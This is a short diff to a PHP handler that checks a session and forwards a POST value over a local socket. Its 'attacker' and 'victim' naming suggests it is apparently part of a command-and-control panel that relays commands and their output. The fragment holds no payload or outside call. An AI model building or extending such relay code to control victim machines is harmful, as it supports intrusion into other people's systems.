@@ -9,10 +9,10 @@
 	*/
 	function run($databaseManager, $conn, $sessionManager){
 		# Check if the session is already stored
-		if($sessionManager->isCurrentSessionStored("attacker")){
-			if(isset($_POST['command'])){
+		if($sessionManager->isCurrentSessionStored("victim")){
+			if(isset($_POST['output'])){
 
-				# Connection parameters
+                # Connection parameters
                 $address = "127.0.0.1";
                 $port = 10000;
 
@@ -43,11 +43,13 @@
                 }
 
                 # Send command
-                socket_write($sock, $_POST['command'], strlen($_POST['command']));
+                socket_write($sock, $_POST['output'], strlen($_POST['output']));
 
 				# Close connection
                 socket_close($sock);
-			}
+
+            }
+
         }else{
             echo "Your user is not logged. First login, then enter this page.";
             // 401 Unauthorized
